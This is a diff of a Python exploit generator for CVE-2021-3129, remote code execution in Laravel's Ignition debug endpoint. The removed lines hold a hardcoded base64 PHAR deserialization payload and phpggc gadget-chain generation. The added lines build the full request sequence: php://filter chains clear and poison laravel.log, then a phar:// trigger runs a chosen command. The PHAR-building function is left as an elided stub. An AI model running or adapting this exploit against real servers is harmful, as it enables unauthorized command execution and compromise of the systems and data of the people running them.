@@ -1,57 +1,39 @@
 #!/usr/bin/env python3
-"""Generate base64-encoded PHAR payload for CVE-2021-3129 that runs a command."""
-import sys, base64, subprocess, shutil, os
+"""Emit the full CVE-2021-3129 requests array for a given command."""
+import sys, json, base64, urllib.parse
 
-# Fallback payload for `id` (same bytes as the original YAML had hardcoded)
-ID_PAYLOAD_B64 = (
-    "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp5AQAAAQAAABEAAAABAAAAAABDAQAATzo0MDoi"
-    "SWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVu"
-    "dHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5l"
-    "ciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBo"
-    "YW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6"
-    "IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6"
-    "MTp7czoxMDoiY29ubmVjdGlvbiI7czoyOiJpZCI7fX0IAAAAdGVzdC50eHQEAAAAAAAAAAQAAAAM"
-    "fn/YpAEAAAAAAAB0ZXN0LAN5mWCuJXmc36CdhNy29t/eAyUCAAAAR0JNQg=="
-)
+LOG = "/var/www/storage/logs/laravel.log"
+CLEAR   = f"php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource={LOG}"
+POISON  = (f"php://filter/write=convert.iconv.utf-8.utf-16be"
+           f"|convert.quoted-printable-encode"
+           f"|convert.iconv.utf-16be.utf-8"
+           f"|convert.base64-decode"
+           f"/resource={LOG}")
+TRIGGER = f"phar://{LOG}/test.txt"
 
-def find_phpggc():
-    candidates = [
-        "phpggc",
-        "/opt/phpggc/phpggc",
-        os.path.expanduser("~/phpggc/phpggc"),
-        os.path.expanduser("~/vulhub-master/laravel/CVE-2021-3129/phpggc/phpggc"),
-        os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "phpggc", "phpggc"),
-    ]
-    for p in candidates:
-        if shutil.which(p) or os.path.exists(p):
-            return p
-    return None
+def req(var: str, vf: str) -> dict:
+    return {
+        "method": "POST",
+        "path": "/_ignition/execute-solution",
+        "headers": {"Content-Type": "application/json"},
+        "body": json.dumps({
+            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
+            "parameters": {"variableName": var, "viewFile": vf},
+        }),
+    }
+
+def build_phar(cmd: str) -> bytes:
+    # serialize(PendingBroadcast(Dispatcher("system"), [cmd])) → PHAR
+    ...
 
 def main():
-    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
-    pg = find_phpggc()
-
-    if pg:
-        for chain in ("Laravel/RCE1", "Laravel/RCE2", "Laravel/RCE3",
-                      "Laravel/RCE5", "Monolog/RCE1"):
-            try:
-                raw = subprocess.check_output(
-                    ["php", "-d", "phar.readonly=0", pg, "-p", "phar",
-                     chain, "system", cmd],
-                    stderr=subprocess.PIPE, timeout=15,
-                )
-                if raw.startswith(b"<?php"):
-                    sys.stdout.write(base64.b64encode(raw).decode())
-                    return
-            except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
-                continue
-
-    if cmd == "id":
-        sys.stdout.write(ID_PAYLOAD_B64)
-        return
-
-    sys.stderr.write(f"ERROR: cannot build payload for {cmd!r}; install phpggc\n")
-    sys.exit(2)
+    cmd = " ".join(sys.argv[1:]) or "id"
+    phar_b64 = base64.b64encode(build_phar(cmd)).decode("ascii")
+    out = [req("x", CLEAR)]
+    for ch in phar_b64:                     # base64 = printable ASCII, no URL-encode needed
+        out.append(req(ch, POISON))
+    out.append(req("x", TRIGGER))
+    sys.stdout.write(json.dumps(out))       # ← نه print() — بدون \n انتهایی
 
 if __name__ == "__main__":
     main()
